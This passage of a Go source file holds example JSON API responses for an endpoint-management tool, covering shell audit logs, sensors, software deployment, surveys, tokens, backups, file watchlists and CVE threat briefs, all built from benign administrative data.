			{"id": 5120, "session_id": "sh-3e7a1c5f9b2d48e6a0c4d8f2b6e1a3c9", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "ran_by": "rpatel", "command": "tail -n 50 /var/log/nginx/error.log", "output": "2026/10/20 09:02:41 [error] 1187#1187: *88213 upstream timed out (110: Connection timed out) while reading response header from upstream, client: 10.20.0.5, server: www.example.com, request: \"GET /api/orders HTTP/1.1\", upstream: \"http://127.0.0.1:8080/api/orders\"\n2026/10/20 09:07:18 [error] 1187#1187: *88904 upstream timed out (110: Connection timed out) while reading response header from upstream, client: 10.20.0.5, server: www.example.com, request: \"GET /api/orders HTTP/1.1\", upstream: \"http://127.0.0.1:8080/api/orders\"\n", "exit_code": 0, "ran_at": "2026-10-20T09:13:40Z"}
		]
	}`,

	// settings
	"GET /api/admin/settings": `{` + settingsFields + `, "stream_retention_hours": 4}`,
	// The settings after the update, which takes effect at once: here
	// the stream kept for 8 hours instead of 4.
	"POST /api/admin/settings": `{` + settingsFields + `, "stream_retention_hours": 8}`,
	// Who the saved Fleet API token signs in as, and their Fleet role.
	// With no Fleet URL and token saved (as in the settings above), the
	// answer is a 400.
	"POST /api/admin/mail-test":                      `{"result": "sent"}`,
	"GET /api/admin/email-templates":                 `{"kinds": [{"kind": "vulnerability", "label": "New vulnerabilities", "description": "New findings after a scan.", "default": {"subject": "[mustra] {{.Title}}", "text": "{{.Body}}", "html": ""}, "variables": [{"name": ".Title", "desc": "The one-line summary"}], "custom": {"subject": "", "text": "", "html": ""}}], "shared": {"vars": {"company": "Example Ltd"}, "macros": ""}, "functions": [{"name": "upper", "example": "{{upper .Severity}}", "desc": "Capitals"}]}`,
	"PUT /api/admin/email-templates/{kind}":          `{"kinds": [{"kind": "vulnerability", "label": "New vulnerabilities", "description": "New findings after a scan.", "default": {"subject": "[mustra] {{.Title}}", "text": "{{.Body}}", "html": ""}, "variables": [{"name": ".Title", "desc": "The one-line summary"}], "custom": {"subject": "", "text": "", "html": ""}}], "shared": {"vars": {"company": "Example Ltd"}, "macros": ""}, "functions": [{"name": "upper", "example": "{{upper .Severity}}", "desc": "Capitals"}]}`,
	"PUT /api/admin/email-shared":                    `{"kinds": [{"kind": "vulnerability", "label": "New vulnerabilities", "description": "New findings after a scan.", "default": {"subject": "[mustra] {{.Title}}", "text": "{{.Body}}", "html": ""}, "variables": [{"name": ".Title", "desc": "The one-line summary"}], "custom": {"subject": "", "text": "", "html": ""}}], "shared": {"vars": {"company": "Example Ltd"}, "macros": ""}, "functions": [{"name": "upper", "example": "{{upper .Severity}}", "desc": "Capitals"}]}`,
	"POST /api/admin/email-templates/{kind}/preview": `{"subject": "[Example Ltd] 2 new critical vulnerabilities", "text": "- CVE-2026-1001 in openssl on db-01", "html": ""}`,
	"POST /api/admin/email-templates/{kind}/test":    `{"result": "sent"}`,
	"POST /api/admin/settings/fleet-test":            `{"user": "mustra-api@corp.example.com (admin)"}`,

	// sensors
	"GET /api/sensors": `{
		"agent_count": 42,
		"agent_count_by_os": {"darwin": 2, "linux": 31, "windows": 9},
		"coverage": [
			{"sensor": "custom_csn-8b2f6d0a4e1c47a9b3d5f7e9c1a3b5d7", "agents": 38, "newest": "2026-10-20T08:39:12Z", "oldest": "2026-10-20T07:44:51Z", "stale": 0, "by_os": {"linux": 30, "windows": 8}},
			{"sensor": "disks", "agents": 42, "newest": "2026-10-20T08:41:52Z", "oldest": "2026-10-17T16:02:38Z", "stale": 1, "by_os": {"darwin": 2, "linux": 31, "windows": 9}}
		],
		"sensors": [
			{
				"template": {
					"platforms": {
						"darwin": {"language": "shell", "output": {"format": "text"}},
						"linux": {"language": "shell", "output": {"format": "text"}},
						"windows": {"language": "powershell", "output": {"format": "text"}}
					},
					"fields": [{"name": "value", "type": "string"}],
					"max_age_seconds": 0,
					"name": "Disks (custom)",
					"description": "Based on built-in Disks. Native disk-usage text, with platform-specific units and columns, rather than the built-in normalized byte counters.",
					"commands": {
						"darwin": "# Standalone example: Native disk-usage text, with platform-specific units and columns, rather than the built-in normalized byte counters.\ndf -Pk\n",
						"linux": "# Standalone example: Native disk-usage text, with platform-specific units and columns, rather than the built-in normalized byte counters.\ndf -Pk\n",
						"windows": "# Standalone example: Native disk-usage text, with platform-specific units and columns, rather than the built-in normalized byte counters.\n$ErrorActionPreference = \"Stop\"\nGet-CimInstance Win32_LogicalDisk | ForEach-Object { '{0} size={1} free={2}' -f $_.DeviceID, $_.Size, $_.FreeSpace }\n"
					},
					"interval_seconds": 900,
					"timeout_seconds": 30,
					"enabled": false,
					"notes": "Native disk-usage text, with platform-specific units and columns, rather than the built-in normalized byte counters."
				},
				"sources": ["inventory.go"],
				"kind": "disks",
				"name": "Disks",
				"summary": "Mounted filesystems and how full they are.",
				"answers": "What is about to run out of space. The single most common preventable outage.",
				"returns": "mountpoint, fstype, total, used, free, used_percent",
				"mechanism": [
					{"os": "all", "how": "gopsutil partition and usage calls, which use the platform's native statfs/GetDiskFreeSpaceEx rather than parsing df output."},
					{"os": "linux", "how": "Home Assistant OS add-on: the Supervisor's /host/info disk_total/disk_used: the add-on container mounts none of the host's filesystems, so the data partition is reported as one disk."}
				],
				"interval": "the agent's sensor interval (15 minutes by default)",
				"timeout": "30 seconds",
				"cost": "Cheap."
			}
		]
	}`,
	"GET /api/sensors/builtin/{kind}/source": `{
		"sources": [
			{"name": "internal/agent/inventory.go", "code": "package agent\n\nimport (\n\t\"context\"\n\t\"fmt\"\n…"},
			{"name": "internal/agent/sensor_loop.go", "code": "package agent\n\nimport (\n\t\"context\"\n\t\"encoding/json\"\n…"}
		]
	}`,
	"GET /api/sensors/custom":  `{"sensors": [{` + timeSyncSensorFields + `, "enabled": true, "created_at": "2026-10-14T13:05:27Z", "updated_at": "2026-10-14T13:22:40Z", "created_by": "jdoe"}]}`,
	"POST /api/sensors/custom": `{` + timeSyncSensorFields + `, "enabled": false, "created_at": "2026-10-14T13:05:27Z", "updated_at": "2026-10-14T13:05:27Z", "created_by": "jdoe"}`,
	// The items are the language server's, as the script-tools service
	// passes them on. Shown for a script that defines sensor_report() and
	// is completed at "sensor_": for the body example's "systemctl
	// is-act", bash-language-server has nothing, and the answer is
	// {"items": []}.
	"POST /api/sensors/custom/complete": `{"items": [{"label": "sensor_report", "detail": "", "kind": 3, "text": "sensor_report", "snippet": false}]}`,
	"POST /api/sensors/custom/parse":    `{"rows": [{"service": "systemd-timesyncd", "state": "active"}]}`,
	// The agent ran the script as text; the server parsed what it printed
	// with the sensor's own output settings. Suggested fields come only
	// from a WQL query.
	"POST /api/sensors/custom/test": `{
		"result": {
			"raw": "systemd-timesyncd,active\n",
			"rows": [{"service": "systemd-timesyncd", "state": "active"}],
			"lines": ["systemd-timesyncd,active"],
			"exit_code": 0
		},
		"suggested_fields": []
	}`,
	"POST /api/sensors/custom/validate": `{"errors": {}}`,
	"PUT /api/sensors/custom/{id}":      `{` + timeSyncSensorFields + `, "enabled": false, "created_at": "2026-10-14T13:05:27Z", "updated_at": "2026-10-14T13:09:03Z", "created_by": "jdoe"}`,
	// Enabled since it was saved: a disabled sensor shows every endpoint
	// as disabled. Endpoints come in hostname order, each with the
	// command for its platform; the Windows laptop has not reported it
	// yet.
	"GET /api/sensors/custom/{id}/results": `{
		"results": [
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"data": {"lines": null, "exit_code": 0},
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"status": "never_reported"
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"collected_at": "2026-10-20T08:39:12Z",
				"data": {
					"fields": [{"name": "service", "type": "string"}, {"name": "state", "type": "string"}],
					"raw": "systemd-timesyncd,active\n",
					"revision": "8f00c6bd5d880e400af034c6e364baf8fd213612ee44b43f970e5489a5d58840",
					"rows": [{"service": "systemd-timesyncd", "state": "active"}],
					"lines": ["systemd-timesyncd,active"],
					"exit_code": 0
				},
				"hostname": "web-01",
				"last_success": {"collected_at": "2026-10-20T08:39:12Z", "rows": [{"service": "systemd-timesyncd", "state": "active"}]},
				"os": "linux",
				"status": "success"
			}
		],
		"sensor": {` + timeSyncSensorFields + `, "enabled": true, "created_at": "2026-10-14T13:05:27Z", "updated_at": "2026-10-14T13:22:40Z", "created_by": "jdoe"}
	}`,

	// shell: rpatel opens a shell on web-01 under the Jump Gate grant jdoe
	// approved for 30 minutes, so the session ends with the grant. An
	// endpoint no Jump Gate policy covers gets no expires_at.
	//
	// The command log for ?session_id= that session.
	"GET /api/shell/audit": `{
		"commands": [
			{
				"id": 2318,
				"session_id": "sh-06a3bd6667aecea31f5776bd3b190881",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"ran_by": "rpatel",
				"command": "tail -n 50 /var/log/nginx/error.log",
				"output": ` + nginxErrorLogTail + `,
				"exit_code": 0,
				"ran_at": "2026-10-20T09:15:37Z"
			}
		]
	}`,
	// Newest first: rpatel's session, still open under the Jump Gate
	// grant that allowed it, and one jdoe closed before the Jump Gate
	// policy existed, so it has no reason, grant or end.
	"GET /api/shell/sessions": `{
		"sessions": [
			{
				"id": "sh-06a3bd6667aecea31f5776bd3b190881",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"opened_by": "rpatel",
				"opened_at": "2026-10-20T09:14:02Z",
				"commands": 1,
				"working_dir": "/",
				"reason": "Investigating high CPU on INC-2041",
				"grant_id": "jg-7c1e5a9f3b2d48e6a0c4b8d2f6e1a3c5",
				"expires_at": "2026-10-20T09:42:40Z"
			},
			{
				"id": "sh-f312e08af21651ca1406b63c1995d71c",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"opened_by": "jdoe",
				"opened_at": "2026-09-08T15:20:44Z",
				"closed_at": "2026-09-08T15:31:09Z",
				"commands": 3,
				"working_dir": "/etc/nginx"
			}
		]
	}`,
	"POST /api/shell/sessions": `{
		"expires_at": "2026-10-20T09:42:40Z",
		"hostname": "web-01",
		"session_id": "sh-06a3bd6667aecea31f5776bd3b190881",
		"working_dir": "/"
	}`,
	// The agent's reply to the body example, passed through.
	"POST /api/shell/sessions/{id}/exec": `{"output": ` + nginxErrorLogTail + `, "exit_code": 0, "working_dir": "/"}`,

	// software
	"GET /api/software": `{
		"applicability": {
			"sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5": {"installed": 9, "install_eligible": 3, "not_applicable": 30}
		},
		"packages": [` + jqPackageExample + `],
		"self_service_platforms": {
			"sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5": ["darwin", "windows"]
		}
	}`,
	"POST /api/software": jqPackageExample,
	// The body example adopts jq, which the fleet runs and the catalog
	// already has: adopting does not look, so this is a second jq package,
	// disabled until someone reads its commands.
	"POST /api/software/adopt": `{
		"self_service_follow_latest": false,
		"id": "sw-2f8a4c6e0b1d47e9a3c5b7d9f1e3a5c7",
		"kind": "software",
		"name": "jq",
		"vendor": "",
		"version": "1.7.1",
		"description": "Adopted from software already installed across the fleet. Check the commands below, then enable the package to make it deployable.",
		"category": "",
		"icon": "",
		"commands": {
			"linux": {"install": "apt-get install -y jq", "update": "apt-get install -y --only-upgrade jq", "remove": "apt-get remove -y jq"}
		},
		"detect": {"app_name": "jq", "match": "exact"},
		"requirements": {},
		"group_ids": [],
		"self_service": false,
		"allow_requests": false,
		"require_explicit_targets": false,
		"enabled": false,
		"source": "discovered",
		"command_timeout_seconds": 0,
		"expire_seconds": 0,
		"created_at": "2026-10-20T10:48:36Z",
		"updated_at": "2026-10-20T10:48:36Z",
		"created_by": "jdoe",
		"updated_by": ""
	}`,
	"POST /api/software/deploy": `{"operation": "install", "plan": "", "run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "skipped": 0, "targets": 2}`,
	// What the fleet's installed-applications snapshots hold, on the most
	// endpoints first. jq's name matches a package, so it is in_catalog.
	"GET /api/software/discover": `{
		"software": [
			{"name": "jq", "vendor": "", "versions": ["1.6", "1.7.1"], "device_count": 9, "platforms": ["linux"], "in_catalog": true},
			{"name": "Example Diagram Studio", "vendor": "Example Software", "versions": ["4.2.0"], "device_count": 6, "platforms": ["darwin", "windows"], "in_catalog": false}
		]
	}`,
	"PUT /api/software/{id}": jqPackageExample,
	"GET /api/software/{id}/applicability": `{
		"counts": {"installed": 1, "install_eligible": 1},
		"endpoints": [
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "os": "linux", "platform": "ubuntu", "site": "dc-east", "online": true, "state": "installed", "found_version": "1.7.1"},
			{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "os": "windows", "platform": "Microsoft Windows 11 Pro", "site": "hq", "online": true, "state": "install_eligible"}
		],
		"package": ` + jqPackageExample + `
	}`,
	"GET /api/software/{id}/files":  `{"files": [` + jqPackageFileExample + `]}`,
	"POST /api/software/{id}/files": jqPackageFileExample,

	// surveys: the laptop survey of the body examples, anonymous.
	"GET /api/surveys": `{"min_responses": 5, "surveys": [` + surveyLaptopSummary + `]}`,
	// A new survey: updated_at is created_at until it is saved again.
	"POST /api/surveys": `{` + surveyLaptopFields + `, "updated_at": "2026-10-19T10:12:40Z"}`,
	// Every reply the summary counts, newest first. The survey is
	// anonymous, so no reply names an endpoint, a hostname or a person,
	// and submitted_at is cut to the day.
	"GET /api/surveys/{id}": `{
		"responses": [
			{"id": "sr-8a2c6e0f4b1d47e9a3c5b7d9f1e2a4c6", "survey_id": "svy-5c9e1a3f7b2d48e6a0c4b8d2f6e1a3c7", "run_id": "run-2d6f0b4a8c1e47e9b3a5c7d9f1e3a5b8", "answers": [{"question_id": "overall", "rating": 2}, {"question_id": "speed", "choice": "Slower"}, {"question_id": "comments", "text": "Teams freezes when I share my screen"}], "declined": false, "submitted_at": "2026-10-20T00:00:00Z"},
			{"id": "sr-1f5b9d3e7a2c48e6b0a4c8d2f6e1a3b7", "survey_id": "svy-5c9e1a3f7b2d48e6a0c4b8d2f6e1a3c7", "run_id": "run-2d6f0b4a8c1e47e9b3a5c7d9f1e3a5b8", "answers": [], "declined": true, "submitted_at": "2026-10-20T00:00:00Z"},
			{"id": "sr-6c0e4a8f2b1d47e3a9c5d7f1b3e9a0c5", "survey_id": "svy-5c9e1a3f7b2d48e6a0c4b8d2f6e1a3c7", "run_id": "run-2d6f0b4a8c1e47e9b3a5c7d9f1e3a5b8", "answers": [{"question_id": "overall", "rating": 5}, {"question_id": "speed", "choice": "Faster"}], "declined": false, "submitted_at": "2026-10-19T00:00:00Z"},
			{"id": "sr-3e7a1c5f9b2d48e6a0c4b8d2f6e1a3c8", "survey_id": "svy-5c9e1a3f7b2d48e6a0c4b8d2f6e1a3c7", "run_id": "run-2d6f0b4a8c1e47e9b3a5c7d9f1e3a5b8", "answers": [{"question_id": "overall", "rating": 4}, {"question_id": "speed", "choice": "About the same"}, {"question_id": "comments", "text": "The dock does not wake the second monitor"}], "declined": false, "submitted_at": "2026-10-19T00:00:00Z"},
			{"id": "sr-9d3f7b1a5e2c48b6a0d4c8e2f6b1a9d4", "survey_id": "svy-5c9e1a3f7b2d48e6a0c4b8d2f6e1a3c7", "run_id": "run-2d6f0b4a8c1e47e9b3a5c7d9f1e3a5b8", "answers": [{"question_id": "overall", "rating": 4}, {"question_id": "speed", "choice": "Faster"}, {"question_id": "comments", "text": "Battery lasts all day now"}], "declined": false, "submitted_at": "2026-10-19T00:00:00Z"},
			{"id": "sr-4b8d2f6a0c1e47e9b3a5c7d9f1e3a5b9", "survey_id": "svy-5c9e1a3f7b2d48e6a0c4b8d2f6e1a3c7", "run_id": "run-2d6f0b4a8c1e47e9b3a5c7d9f1e3a5b8", "answers": [{"question_id": "overall", "rating": 5}, {"question_id": "speed", "choice": "Faster"}], "declined": false, "submitted_at": "2026-10-19T00:00:00Z"}
		],
		"summary": ` + surveyLaptopSummary + `
	}`,
	"PUT /api/surveys/{id}": surveyLaptopRecord,
	// The body example asks FIN-LT-0142 again, which is online. The new
	// run has one action per endpoint. An endpoint already asked is not
	// counted twice, so sent stays at 28.
	"POST /api/surveys/{id}/send": `{"message": "asked 1 endpoint(s)", "run_id": "run-7e1a5c9f3b2d48e6a0c4b8d2f6e1a3c9", "targets": 1}`,

	// software-inventory
	// ?filter=tracked, so the one tracked product. The summary is the
	// whole inventory's, whatever the filter.
	"GET /api/software-inventory": `{
		"products": [` + diagramStudioProductExample + `],
		"summary": {` + softwareInventorySummaryFields + `, "rolled_up_at": "2026-10-20T09:31:12.207645118Z"}
	}`,
	// Most recently used first. FIN-LT-0142's last use is Windows'
	// Prefetch record, later that day than the rollup's; build-mac-02's
	// is what Spotlight recorded. history counts launches of the
	// product's executables per day. tracked is null for a product
	// nobody tracks.
	"GET /api/software-inventory/product/{key}": `{
		"devices": [
			{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "os": "windows", "online": true, "version": "24.2.1", "executable": "diagramstudio", "install_date": "2026-05-19", "first_seen": "2026-07-23T09:16:40Z", "last_used": "2026-10-19T14:22:51Z", "days_used": 2, "launches": 3, "usage": "light", "used": true},
			{"agent_id": "agt-a5f17ac9d34a0b8dd362373426b5497f", "hostname": "build-mac-02", "os": "darwin", "online": true, "version": "24.2.1", "executable": "diagramstudio", "install_date": "2026-05-28", "first_seen": "2026-07-23T09:16:40Z", "last_used": "2026-06-03T10:12:40Z", "days_used": 0, "launches": 0, "usage": "unused", "used": false}
		],
		"history": [
			{"day": "2026-10-12", "devices": 1, "launches": 1},
			{"day": "2026-10-19", "devices": 1, "launches": 2}
		],
		"product": ` + diagramStudioProductExample + `,
		"tracked": {
			"id": "trk-2691c747da54257d11c96e754ef3b46a",
			"product_key": "example diagram studio",
			"name": "Example Diagram Studio",
			"vendor": "Example Software",
			"executables": ["diagramstudio"],
			"cost_per_seat_cents": 1500,
			"currency": "USD",
			"package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5",
			"notes": "Licensed per seat; renews in March",
			"created_by": "jdoe",
			"created_at": "2026-08-04T13:27:19Z",
			"updated_at": "2026-08-04T13:27:19Z"
		},
		"window_days": 30
	}`,
	// Without dry_run, for a product whose catalog package has a remove
	// command on the unused endpoints' platform: those endpoints, handed
	// to the software deployment as an explicit list for that command.
	// A dry run, like the body example, answers with the endpoints instead.
	"POST /api/software-inventory/product/{key}/remove-unused": `{"operation": "remove", "plan": "", "run_id": "run-3758ac9cc2f40fe08431dd051650154c", "skipped": 0, "targets": 1}`,
	// The rollup has just run, so rolled_up_at is now.
	"POST /api/software-inventory/refresh": `{"summary": {` + softwareInventorySummaryFields + `, "rolled_up_at": "2026-10-20T09:46:03.581274903Z"}}`,

	// tokens
	"GET /api/admin/tokens": `{
		"permissions": ["settings.manage", "users.manage", "patches.manage", "deploy.manage", "groups.manage", "deploy.override_windows", "enforce.recovery_keys", "approvals.decide", "sessions.audit", "jump.approve", "alerts.triage"],
		"tokens": [
			{
				"id": "tok-6e2a8c4f0b1d47e9a3c5b7d9f1e3a0c2",
				"name": "SIEM session transcript export",
				"prefix": "mstr_q7Xc2LpA",
				"permissions": ["sessions.audit"],
				"created_at": "2026-09-01T11:30:00Z",
				"created_by": "jdoe",
				"expires_at": "2026-11-30T11:30:00Z",
				"last_used_at": "2026-10-20T08:00:03Z",
				"revoked": false,
				"created_by_id": "usr-2e6a0c4f8b1d47e3a9c5f1b7d3e0a8c6",
				"approval_exempt": false
			}
		]
	}`,
	"PUT /api/admin/tokens/{id}": `{"id": "tok-6e2a8c4f0b1d47e9a3c5b7d9f1e3a0c2", "name": "SIEM session transcript export", "prefix": "mstr_q7Xc2LpA", "permissions": ["sessions.audit", "alerts.triage"], "created_at": "2026-09-01T11:30:00Z", "created_by": "jdoe", "expires_at": "2026-11-30T11:30:00Z", "last_used_at": "2026-10-20T08:00:03Z", "revoked": false, "created_by_id": "usr-2e6a0c4f8b1d47e3a9c5f1b7d3e0a8c6", "approval_exempt": false}`,
	"POST /api/admin/tokens":     `{"id": "tok-6e2a8c4f0b1d47e9a3c5b7d9f1e3a0c2", "note": "Copy this now — it isn't stored and can't be shown again.", "token": "mstr_<token, shown once>"}`,

	// update-check
	// The newest release on GitHub is newer than this server: its notes
	// (cut at 1200 characters) and the command that takes it.
	"POST /api/admin/update-check": `{
		"checked": true,
		"up_to_date": false,
		"message": "Version 0.94.1 is available. This server is running 0.93.0.",
		"running_version": "0.93.0",
		"latest_version": "0.94.1",
		"latest_name": "0.94.1",
		"latest_date": "2026-10-21T07:59:35Z",
		"release_url": "https://github.com/mustra-dev/mustra/releases/tag/v0.94.1",
		"release_notes": "Server 0.94.1 and a new script-tools image; the agent is unchanged (0.57.42). No schema change. Rebuild or pull both images.",
		"upgrade_command": "docker compose pull server script-tools && docker compose up -d server script-tools"
	}`,

	// tracked-products: the list holds the product as last edited.
	"GET /api/tracked-products":      `{"tracked": [{` + diagramStudioTrackedFields + `, "updated_at": "2026-10-15T08:30:12Z"}]}`,
	"POST /api/tracked-products":     `{` + diagramStudioTrackedFields + `, "updated_at": "2026-10-02T13:47:21Z"}`,
	"PUT /api/tracked-products/{id}": `{` + diagramStudioTrackedFields + `, "updated_at": "2026-10-15T08:30:12Z"}`,

	// users
	"GET /api/admin/users":              `{"users": [{` + userJdoeFields + `, "active": true}, ` + userNewExample + `]}`,
	"POST /api/admin/users":             userNewExample,
	"POST /api/admin/users/{id}/active": `{` + userJdoeFields + `, "active": false}`,
	"POST /api/admin/users/{id}/admin":  `{` + userJdoeFields + `, "active": true}`,

	// version
	"GET /api/version": `{"agent": "0.57.41", "build_time": "2026-10-20T16:42:08Z", "commit": "6a51892e0c4d", "server": "0.93.0"}`,

	// watchlists: the list holds the watchlist as last edited. It sends
	// all seven built-in templates; the example shows the shortest.
	"GET /api/watchlists": `{
		"templates": [
			{
				"id": "exchange",
				"name": "Microsoft Exchange",
				"description": "Exchange Server web roots and transport configuration, where webshells and transport agents land.",
				"paths": [
					"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth",
					"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth",
					"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess",
					"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin",
					"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\TransportRoles\\Shared",
					"C:\\inetpub\\wwwroot\\aspnet_client"
				],
				"registry_keys": [
					"HKLM\\SOFTWARE\\Microsoft\\ExchangeServer\\v15\\Setup",
					"HKLM\\SYSTEM\\CurrentControlSet\\Services\\MSExchangeTransport"
				]
			}
		],
		"watchlists": [{` + webConfigWatchlistFields + `, "updated_at": "2026-10-14T16:05:48Z"}]
	}`,
	"POST /api/watchlists":     `{` + webConfigWatchlistFields + `, "updated_at": "2026-09-24T10:12:07Z"}`,
	"PUT /api/watchlists/{id}": `{` + webConfigWatchlistFields + `, "updated_at": "2026-10-14T16:05:48Z"}`,
}

// backupSourceExample is the PBS server of the body example, read once.
const backupSourceExample = `{
	"id": "bks-5d2e8a1c9f3b47e6a0d4c8b2f6e1a3d9",
	"kind": "pbs",
	"name": "Backup server",
	"url": "https://pbs.corp.example.com:8007",
	"token_id": "mustra@pbs!status",
	"fingerprint": "24c9cacbc211c8772dbba0289d47a1b2c3d4e5f60718293a4b5c6d7e8f901234",
	"datastore": "",
	"enabled": true,
	"last_polled_at": "2026-10-20T08:15:02Z",
	"last_ok_at": "2026-10-20T08:15:02Z",
	"last_error": "",
	"created_by": "jdoe",
	"created_at": "2026-10-14T09:30:00Z",
	"updated_at": "2026-10-14T09:30:00Z",
	"secret_set": true,
	"items": 2,
	"stores": [{"name": "backups", "used_bytes": 304770736128, "total_bytes": 568267104256, "full_at": "2027-03-02T06:00:00Z"}]
}`

// backupSystemExample is that server as GET /api/backup-status shows it.
const backupSystemExample = `{
	"id": "bks-5d2e8a1c9f3b47e6a0d4c8b2f6e1a3d9",
	"name": "Backup server",
	"kind": "pbs",
	"polled_at": "2026-10-20T08:15:02Z",
	"ok_at": "2026-10-20T08:15:02Z",
	"stores": [{"name": "backups", "used_bytes": 304770736128, "total_bytes": 568267104256, "full_at": "2027-03-02T06:00:00Z"}],
	"jobs": [
		{"kind": "verify", "id": "v-3d1e225c-e81e", "store": "backups", "state": "OK", "last_end": "2026-10-20T03:12:40Z", "next_run": "2026-10-21T00:00:00Z", "schedule": "daily"},
		{"kind": "gc", "id": "backups", "store": "backups", "state": "OK", "last_end": "2026-10-20T06:43:07Z", "next_run": "2026-10-21T06:30:00Z", "schedule": "06:30", "detail": "freed 34.7 GiB, 53.2 GiB pending removal"}
	],
	"items": [
		{"key": "backups:host/pihole2", "type": "host", "name": "pihole2", "last_backup": "2026-10-20T01:37:57Z", "count": 4, "size_bytes": 25387572, "verified": "none", "protected": true, "location": "backups", "agent_id": "agt-6c1e9a3f5b7d48e2a0c4d8b6f2e1a3c5", "hostname": "pihole2", "age_hours": 6.62, "state": "ok"},
		{"key": "backups:vm/101", "type": "vm", "name": "101", "vmid": 101, "last_backup": "2026-10-19T21:30:12Z", "count": 14, "size_bytes": 4831838208, "verified": "ok", "protected": true, "location": "backups", "guest_name": "web-01", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "age_hours": 11.25, "state": "ok", "in_proxmox": true}
	],
	"counts": {"ok": 2}
}`

const threatPHPBriefExample = `{
	"id": "tb-7e3a9c1f5b2d48e6a0c4b8d2f6e1a3c5",
	"kind": "custom",
	"title": "PHP2Shell: CVE-2026-109618 and CVE-2026-109619",
	"cves": ["CVE-2026-109618", "CVE-2026-109619"],
	"summary": "Two critical PHP flaws let an unauthenticated request run code on a web server.",
	"ransomware": false,
	"kev": false,
	"cvss": 9.2,
	"rule": {"label": "PHP", "checked": true, "appliance": false},
	"vulnerable": 2,
	"present": 1,
	"cleared": 3
}`

const threatPlexBriefExample = `{
	"id": "kev-CVE-2026-96656",
	"kind": "kev",
	"title": "Plex Media Server External Control of File Name or Path Vulnerability",
	"cves": ["CVE-2026-96656"],
	"vendor": "Plex",
	"product": "Media Server",
	"summary": "Plex Media Server contains an external control of file name or path vulnerability which can allow an admin user to write arbitrary files.",
	"date_added": "2026-10-20T00:00:00Z",
	"due_date": "2026-11-10T00:00:00Z",
	"ransomware": false,
	"kev": true,
	"epss": 0.0412,
	"rule": {"label": "Plex Media Server", "checked": true, "appliance": false},
	"vulnerable": 0,
	"present": 1,
	"cleared": 0
}`

const threatPlexDetailExample = `{
	"id": "kev-CVE-2026-96656",
	"kind": "kev",
	"title": "Plex Media Server External Control of File Name or Path Vulnerability",
	"cves": ["CVE-2026-96656"],
	"vendor": "Plex",
	"product": "Media Server",
	"summary": "Plex Media Server contains an external control of file name or path vulnerability which can allow an admin user to write arbitrary files.",
	"date_added": "2026-10-20T00:00:00Z",
	"due_date": "2026-11-10T00:00:00Z",
	"ransomware": false,
	"kev": true,
	"epss": 0.0412,
	"rule": {"label": "Plex Media Server", "checked": true, "appliance": false},
	"vulnerable": 0,
	"present": 1,
	"cleared": 0,
	"cve_details": [{"cve": "CVE-2026-96656", "name": "Plex Media Server External Control of File Name or Path Vulnerability", "description": "Plex Media Server contains an external control of file name or path vulnerability which can allow an admin user to write arbitrary files.", "kev": true, "date_added": "2026-10-20T00:00:00Z", "due_date": "2026-11-10T00:00:00Z", "required_action": "Apply mitigations per vendor instructions or discontinue use of the product if mitigations are unavailable.", "ransomware": false, "epss": 0.0412, "percentile": 0.8875}],
	"refs": [{"label": "forums.plex.tv", "url": "https://forums.plex.tv/t/important-security-update-for-plex-media-server-v1-43-2-and-earlier/942319"}, {"label": "NVD: CVE-2026-96656", "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96656"}],
	"endpoints": [{"agent_id": "agt-6c1e9a3f5b7d48e2a0c4d8b6f2e1a3c5", "hostname": "media-01", "os": "linux", "online": true, "status": "present", "product": "plexmediaserver", "version": "1.43.1.10611-1e34174b1"}],
	"versions": [{"os": "linux", "product": "plexmediaserver", "version": "1.43.1.10611-1e34174b1", "count": 1}],
	"trend": [{"day": "2026-10-20T00:00:00Z", "vulnerable": 0, "present": 1}],
	"questions": ["get hostname and installed_apps.name and installed_apps.version from all machines with installed_apps.name matches_regex \"(?i)^(plex media server|plexmediaserver)$\"", "get hostname and services.name and services.status from all machines with services.name matches_regex \"(?i)^(plexmediaserver)$\""],
	"editable": true,
	"rule_spec": {"label": "Plex Media Server", "apps": ["plex media server", "plexmediaserver"], "services": ["plexmediaserver"]}
}`

const threatBriefExample = `{
	"id": "tb-7e3a9c1f5b2d48e6a0c4b8d2f6e1a3c5",
	"title": "PHP2Shell: CVE-2026-109618 and CVE-2026-109619",
	"cves": ["CVE-2026-109618", "CVE-2026-109619"],
	"summary": "Two critical PHP flaws let an unauthenticated request run code on a web server.",
	"mitigation": "Update PHP to 8.5.12, 8.4.27, 8.3.36 or 8.2.35.",
	"refs": [{"label": "PHP.net advisory", "url": "https://www.php.net/ChangeLog-8.php"}],
	"rule": {"label": "PHP", "apps": ["php[0-9.]*(-cli|-fpm|-common)?"], "processes": ["php-fpm"]},
	"questions": ["get hostname and processes.name from all machines with processes.name contains php"],
	"archived": false,
	"created_by": "jdoe",
	"created_at": "2026-10-20T09:12:00Z",
	"updated_at": "2026-10-20T09:12:00Z"
}`

